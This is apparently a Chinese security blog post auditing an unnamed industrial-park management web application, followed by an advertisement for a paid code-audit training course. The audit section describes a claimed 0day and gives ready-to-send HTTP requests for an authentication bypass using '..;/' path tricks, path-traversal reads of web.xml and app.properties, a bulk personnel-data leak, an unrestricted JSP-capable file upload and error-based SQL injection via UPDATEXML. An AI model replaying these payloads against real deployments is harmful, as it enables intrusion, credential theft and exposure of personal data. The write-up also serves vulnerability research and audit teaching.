#  某园区0day代码审计  
 进击安全   2026-04-30 02:12  
  
# 1、权限绕过  
## 1.1、方法一  
  
这里看spring-mvc  
的配置，找到SpringMVC  
拦截器  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWiaNEJiaIibY3W02oDb42tTibm4c0P8Che3l0EezS9HFiaicPaDAFMlaug4pg/640?wx_fmt=jpeg&from=appmsg "")  
  
跟进拦截器，主要看看拦截规则写的什么，判断地址是否为白名单，如果部位白名单进入到  
  
if (session.getAttribute("__sessional_user__") == null) {  
循环中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWFd7zhzKNLJY6O0fV8o4uvyBROyKvmzk6UWqLBOV5qic5XPsO9Rey0ug/640?wx_fmt=png&from=appmsg "")  
  
白名单地址为  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWycWDrLQo3B5xH6Aujf7WEcNfAJ1LHVCUXcOgIMTvrwpCaJh2hMJFpA/640?wx_fmt=png&from=appmsg "")  
  
然后跟踪isWhiteUri  
函数，这里的权限绕过是因为contains  
函数，这个函数意思是只要内容包含白名单的路径，他就会返回true  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWxGEWZZACdEC8UFCFO5vpQlIQYTq8kwUobzm2GEhQG5PRKvHYIuUBjQ/640?wx_fmt=png&from=appmsg "")  
  
这里就可以用/白名单/..;/..;/绕过鉴权，如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWOvgWwcCTI25LvFofic9FLVmuWG63CIqSetUvqchrFtDjEdu5G1OfribQ/640?wx_fmt=png&from=appmsg "")  
## 1.2、方法二  
  
如果请求的地址不是白名单，则进入到if循环和try-catch  
语句中，第一个if  
里面的不用看了，到现在还没有绕过来。主要看第二个鉴权的代码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWzzMchCp8wy8We9AxANGjJ6Wcf0qBvIq2w3Q01ibicpzQJibUiaibkmLkR8g/640?wx_fmt=png&from=appmsg "")  
  
这里的逻辑主要是判断，解密后的数组recoToken  
用,  
分割判断长度是为2，并且数组第二位是否为数字，之后才会将信息添加到session  
中。那么加密代码如下  
- [ ] 数组第二位为字母，不执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWVKCXuPO2zdmncBa193eewmiaylJlIpdHWp4TWU1npPnQIJzC5tlpJwQ/640?wx_fmt=png&from=appmsg "")  
- [ ] 为数字执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWtmLWbcXTQFwjdstrqADcKsJdziaVeP1JKlvdxByGYLxmZ3sjQUEh1hg/640?wx_fmt=png&from=appmsg "")  
  
成功绕过  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWmWeiaVibyDD2RhNmWcevWTQhA7p4Qs62lEhPXF7FQ5bJwohEHibKTzdqg/640?wx_fmt=png&from=appmsg "")  
  
‍  
# 2、文件读取1  
  
全局搜索download  
关键字，这里的函数fileDownload.do  
请求时需要带参数fileId  
，该参数没有任何的过滤，用getRootPath  
获取请求的路径，之后在用loadFile  
加载该路径。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWtBPO3iciad1Q3iaicaqBSsOAyeHwgvCIUNKhnS8gzP0AhPEOAZZu53fg7w/640?wx_fmt=jpeg&from=appmsg "")  
  
payload：  
```
GET /manage/personnel/fileDownload.do?fileId=/WEB-INF/web.xml&recoToken=ZuZBOrvLG8M HTTP/1.1Host: xUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWibO2ibXw3b1FuRibMOnxTG5Tiby9d862SvKlhCACAt37OLzibTt32yBrtAw/640?wx_fmt=png&from=appmsg "")  
  
‍  
# 3、文件读取2  
  
参数imgDownload.do  
，这里也是直接请求路径，之后读取该路径的数据。这里有个主意的是参数getCaptureDirectoryPhysicalPath  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWJvUI0lsoVTzj6rR2LPxeiaibng7XnxD2Qx6zhGichCK9OBq3jWyg2S4UQ/640?wx_fmt=png&from=appmsg "")  
  
跟进getCaptureDirectoryPhysicalPath  
，这里重要的是基础的路径后面加了三个../  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWMh5mAnolx5Bovgc1IMnFtHlQYicnYBcR2REy4PCppuryMX3v1rp18ibw/640?wx_fmt=jpeg&from=appmsg "")  
  
那这里的跳转的路径直接到/manage 目录下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWTMUZ1Zn73Q5s6IVX0Al6qhpyX6p2nVUdqafVkLicuce5XIMibx6r8nrw/640?wx_fmt=png&from=appmsg "")  
  
‍  
  
那么请求的敏感文件路径payload  
为  
```
GET /manage/resourceUpload/imgDownload.do?filePath=/manage/WEB-INF/classes/app.properties&recoToken=ZuZBOrvLG8M HTTP/1.1Host: xUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWFEicMiaxw7ouw4YrB5ONCe1OFjicibwabaxeeYjFS6pXIxG9Ka9T7HgnpQ/640?wx_fmt=png&from=appmsg "")  
  
‍  
  
‍  
  
‍  
# 4、信息泄露(账号密码)  
  
主要观察控制层的User  
、Personnel  
等关键字  
  
比如PersonnelController  
，查询到的接口queryPersonnelInfo  
、queryPersonnel  
、getPersonnelById  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWptQfwsNa7ibLCS86Pz6V8uGricXiacboTHuIfSmM1KvvolibF33t0XxA9w/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWEuUjoiafmA9LnFeGORQs40ibMtx6TVnfAsxvna5aPWskcBeibsT3yiaXvw/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWSfO0Jmty3s7UlbYDRu4OT46L5us4b9UHTNWIdibuExichhrzBQGicWN0Q/640?wx_fmt=jpeg&from=appmsg "")  
```
GET /manage/personnel/queryPersonnel.do?page=1&pagesize=1000&recoToken=ZuZBOrvLG8M HTTP/1.1Host: xUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWpOj6IUqHTLic4VSQMTV61JDt1Vr7gIPMVrVc7hxI2yxvcibgsicGO07Jw/640?wx_fmt=png&from=appmsg "")  
  
‍  
  
‍  
# 5、文件上传  
  
这里上传很多，就拿一个举例全局搜索upload  
，定位到  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWP5cMpiaz3qgAm9ic1VclO0N6icAvhZvoXjStn70tZMG6zDvHiaQH6bnnDA/640?wx_fmt=jpeg&from=appmsg "")  
  
‍  
  
就检测一个地方，是不是文件上传的类型，之后用copy  
函数，复制内容和文件名。这里拿txt做样式，jsp后缀可上传。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWo594jjojQUNFRRzXHyGe4bnKQfKfib0as424Oho7CicofxBZFMkTRnBA/640?wx_fmt=jpeg&from=appmsg "")  
```
POST /manage/dgmCommand/resourceUploadFile.do?recoToken=ZuZBOrvLG8M HTTP/1.1Host: xUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELjAccept: */*Connection: close------WebKitFormBoundaryFfJZ4PlAZBixjELjContent-Disposition: form-data; name="3"; filename="1.txt"Content-Type: image/jpeg1------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWJqJzKibT83XJck06MhwnkN4bWb2oRJq6qZhUzlvKiatDCH25iaQh2HyZw/640?wx_fmt=png&from=appmsg "")  
  
‍  
# 12、sql注入1（两处）  
  
SQL注入也很多，拿一个做案例。在下面的mapper  
的目录中，看到有两个可控参数order  
和columnKey  
，这里的columnKey  
注入条件必须order  
不为空才能进行诸如  
  
/manage/WEB-INF/lib/x.server-1.0.jar!/com/x/x/mapper/mysql/black_list/BlackListDsm.xml  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWBGw3CoKaFB6Ecl5zob03a2hs7po6CZScTCnVdwnlfJV1z9lQO1ice2g/640?wx_fmt=png&from=appmsg "")  
  
‍  
  
这里进行反推，找关键函数queryBlackList  
，文件从BlackListDsm  
->BlackListBsm  
->BlackListAsm  
->BlackListController  
  
BlackListDsm  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWSaHFULmAzrVFJePCKGJg61EkNvfiaqsLqOAtdtX5o2Ac42oyccmkREQ/640?wx_fmt=png&from=appmsg "")  
  
BlackListBsmImpl  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWdPQMmecL4ibcmiaSY7DNGc4wibVm13UW81rBTDcd0TDd0RPaVIOxvAUOg/640?wx_fmt=png&from=appmsg "")  
  
BlackListAsmImpl.class  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGW1OjhdXoyGGWYvibiaKEvjdKg5ia7OgeN6Tyw5ncq8U61G3RpTDBKkialOQ/640?wx_fmt=png&from=appmsg "")  
  
‍  
  
BlackListController.class  
，用set  
方法设置参数，并调用函数queryBlackList  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWOoiaoAHR7LCg5BkEdWJPgd70s8J25bnjyoH5WkaANOMbibHb6uyWicxjg/640?wx_fmt=jpeg&from=appmsg "")  
  
‍  
  
那这里的sql注入payload1  
```
GET /manage/systemBlackList/queryBlackList.do?recoToken=ZuZBOrvLG8M&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1Host: xUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedAccept: */*Connection: close
```  
  
payload2  
```
GET /manage/systemBlackList/queryBlackList.do?recoToken=ZuZBOrvLG8M&page=1&pageSize=10&order=asc&columnKey=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1Host: xUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedAccept: */*Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGW6j0sU2zFkESARJePZpD5qCe7BetvXuph1xGWZzTR2hGO9XMHRTYdgg/640?wx_fmt=png&from=appmsg "")  
  
**代码审计培训介绍&广告区域**  
  
  
             历经四期培训，终于迎来了代码审计第五期培训，本次培训依旧一次报名一直可听，并且富含前面四期课程均可以听，先来看看之前的培训都有哪些内容，这里我给大家截屏看看。  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/HBLcNkZ8PQddO5DZYzH4GcwlsOwEK5cR1A5XZuWXTP3ib3tWpcAtuLUaliasnZQvBmenGd0UNicFQOsJGyIzodicicg/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0 "")  
  
一、往期-第四期课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/dJGuszYr5iaRGiaZURAxJAROibCh1sjaZictcbC4iasuuOgCMQSDSwrG5Wfrx2QgfvKx8icDhm0gIia8fN6mThehEK8ww/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=1 "")  
  
###       
  
  
###     我们先来看看上一期课程内容，内容如下，给各位师傅们讲解上一期课程讲解了哪些内容，包括相关的学员出货记录，以及部分课件内容。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=2 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=3 "")  
  
往期-第四期基础课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=4 "")  
  
  
  
  
###   
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTr1WpLvAicsUhyvRMQty3jzKQVY4huIq0jS22JXictjalQGycicCgRYetqydE4agNHCWibeDGEXQLUvZ2ts5Bg3Ep8bSKVbuY7MSI/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=5 "")  
  
此为第四期基础课程，共计授课四十次，此外第四期相较于第三期新增了APP、小程序、WEB逆向，同时主线仍然在代码审计上面，其中基础课程主要目的为：  
  
掌握代码审计思路、完成0-1、能够独立开始审计项目  
。  
  
讲解方向如下：  
  
  
✅ NET代码审计  
✅ APP、小程序、WEB逆向  
  
✅ JAVA代码审计  
  
  
（当然个人认为讲的最好的是JAVA代码审计，而且此次代码审计偏向0-1的实现，更多的是讲解完漏洞原理之后小朋友带着进行实战代码审计，分析各个项目，从理论→实践的演变，当然小朋友们每个课程都是这种方式。）  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=7 "")  
  
往期-第四期  
进阶课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=8 "")  
  
  
  
###   
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRlygRiaODFQq5A4FKzibd065ESmjKntxMLY8tkfSzQHwialEff959Erwx98CRZJRCJRHOic8U642laibIwGEhkgx81oHY8YapeiaOq0/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=9 "")  
  
  
    为什么在第四期课程分为了基础课程以及进阶课程，就是因为发现学员大部分都是为了审计而去审计，单一的去使用某一个方法审计漏洞，而不会进行漏洞的组合拳，扩大危害，  
**虽然自己都是实战案例，但是发现学员都是跟着案例当中的漏洞去套用在了自己的源码\项目当中**  
。  
  
所以开启了第四期进阶代码审计课程，课程目的主要为：  
  
  
✅   
深入理解鉴权  
  
✅   
漏洞组合拳扩大危害  
  
✅   
尝试0-1贴合多数学员完成前台RCE出货  
  
  
（本次授课累计20余次，专项针对以上目的，大量分析鉴权&绕过、组合拳利用、前台RCE）  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=10 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=11 "")  
  
往期-第四期-部分学员报喜&课件  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=12 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSQK5V2Oy1zNftCAn3NBfqSoxiaUbqCjBpOpnSn4Jk1AicPlRwzJgb7mGCWNiaJd5NNUoEgDRdh87h9YeACiaIyTID3vbeIYsNf5tU/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=13 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kSsPNH3XShqgDZCUjMYTEXLMu2AZZcrSIyiakKVDgrI60XcYbHVLYINMv0oJmxx2uUhzc69JwfDWDHexGoBLDL1YsSEKWD1dUqU/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=18 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRY2UET8JjfbKgYEB62qQQEWDQlIuXNYKZ95L7TaAJbch3w36aR7Cg1Sn4Yodk4PNWS3vibD5CBcksB6wkUJY7TEZzX7dJ0RDias/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=20 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/G4zicxKmtXXhicvpUX9R0fxBOic1XNQdlPRrh27zNXQlQ9UYKWLzvZvPYqu3licIgC4v7j1ArN4vfJjoxp4MgTvFmA/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=25 "")  
  
上下滑动查看更多  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Pu52Sn0jPu0EbVUSia7W7sUxTVicmhGmYTkl23iaZv7FdOTQE7bh7lb3gMR7hqLULFpHDq5UyDClYpOMAgnLljB2w/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=26 "")  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kSq9G4YuQr3jbYH8pn53OGXiaLvPa1J4ibddlzNsUOiacMjMF9JBYNUsUCzUAicy8dAC7PrO7KR2q8ZYPJicwxic5AelxKiaXasurEibDw/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=27 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQmDbp3KbVxg5JJEQYRAxcwiajQfvOE6Rhe5dB3TVQGJLEO2TUnKXral0F2AjKt8pAt4X8pKIgQPSicz9A0xX6RJoQBZBLibQj9WM/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=28 "")  
  
  
  
  
  
  
  
  
  
**左右滑动查看更多**  
  
**>**  
  
    那么可能会有师傅提问，为什么没有PHP呢，其实PHP也是有讲解的，只不过大部分是直接的案例，基础的PHP代码审计函数以及基础等，均放在了第三期课程当中。  
  
（部分课件）  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kT5GBSQ3bVCPAA5sOsnYbcG2jIeMZfekNCpCGxlem5VECe4TLHfTuibOors82iaEFRRX5ibm6wFaF6VC4GFg6xEHZFWxOGxTseVuk/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=45 "")  
  
    这也是为什么有的学员在报名之后，我会给他规划学习路线，先看xxx在看xxx，这些都是小朋友认为哪一期的那些内容讲的不错，然后给兄弟们总结出来的优质学习路线。  
  
那么接下来我们可以看看小朋友在做了四期培训之后  
学员出货报喜时刻：  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=46 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=47 "")  
  
往期-学员报喜时刻（部分）  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=48 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTWghKPU8RCEUglFN02tZp9tic3cc4Sj6W4g5VIiaGSIIyqWXe1U3jz7vsjEe4TJUMZ7Rw7GZiaiautO737t051OiaWse5yWV61EjN8/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=49 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSqhPJ31dM9mQbetaPVj5ibGaawtgA66qUdPiaZHzphJooibNiciazbMtu8xicopQQ8IeQODpicm1syNC21Ky5FykJv5NzdiaWqG5RqXvo/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=50 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQ1Nc9zeqn4ZJPGrhkCGZNrdIJeWZHIgTfjpwXPulHncpdUD1YrC75RoECicXfPgickx4SKxGxMI5ibLtLOnk4aW3K1OsGRNPMqxE/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=51 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQnq4myXOqsicupKxrnm8HWfRjh46J4MNodpaRVoibq7Wq7g8TYG8v1lUDB4vrhL8zxicssIKvNJBsdwyKRLx4dHicRQnKadSQfpiaA/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=52 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQRlnTIjxkhKiaF1sibOE7krbK2UwWe6H8AUaHKFm3SHmdAkshEcs0r3YHmb7hNpLEWIA1YPibglbKvrvylNE3ibK31LLdicJq6t1GY/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=53 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRApMIAGHabsOdQlSA0wDWocE2WbZibnvLw4s2KovVJTribDNFkRfaibIx1ypYjQw4icyoTXop5R6wrkEwgO4m7lZlVoXIKoa6Kk0Q/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=54 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQbPk5ic8VTNIcq5qUJJYDLHQJxK7IgmFRU9LiaUbgM1EwGpicrLlIiaDkexJjJujibOkzficmLLVUORicCstSc6SB3BITXOgOzFAKBq4/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=55 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQXV6icIf84H9licCwLqpJuGiatJzJrf22dKB2iau8ibFXatcbDFUxu9vxRWMOGmd0FHZ6So33Cx5UWb2atlDRgibq8QwMGRGicOb7YEI/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=56 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQKk1wm3fTu9omCLX6Qlz7libwd6MHbkHNWkvw0Kan56B3K0Zia5EGmE2wbRL27kqGBjMmHYkJeuMAgR2MxgYYh66zj1ArjsIAqU/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=57 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRSRSwSw5OYGvtW7Uvib4tquOKaCCrh2pREox8HQso8X6rCRJ8bic3q4JSK7dN8LR3O5rxZUKiaKmtrpUaIWJBKics7hBhPT9aTMSY/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=58 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kT7jNngn4Kjj6u7OpYjR0BVmE2DCFtfRKSmVdK9xtCwyRmsEsFVPznIEbHcEUaX8Rc5v2FribW8s92UVAuv7gA2L0pb2w90Eq54/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=59 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQkVPB3zAJzwst6sDoa1aicshcr5XpbKH55STBo1FLtoejo53m19ozpvBK2cRX8P7dBowcHozBhdoha4T59xkxukERMV9c69dTQ/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=60 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Dfrm5V3o6kRS28LlXE6Iqf24qZLeES4bycTowUm4fAu5CUk6d1tfDFtNc7yzX4mNIYcPLd0OVArgKfCiakR8qyE6mKEdD3icgCgniaJDNdFzv8/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=61 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTib50VuZQE02PcfdL53exWmTibxA7ATFpEpdhEibLksjcDDNrvObCG20kH6BsRbg1ibCg8APrLBsFbYiadIviaTf6NTfhAmdEMBDjmk/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=62 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQBQAtC6g1FxPJMkftKlFwlOWbUuVB2SlxjT2pxCrpH0AGlyejAQoGaPODTUdO62DASmJ5avmtgkDAP1QVvqh8u1hrtRJIAtMk/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=63 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Dfrm5V3o6kQsfEXXwrgicYDFmtdhLCyh22Fj8xiciafK4wpPUxU0BpFMfZBDG77ib819dq0h93WqFunNjPjaHacr661ZUHJ7QTO05urYvia8Ixm0/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=64 "")  
  
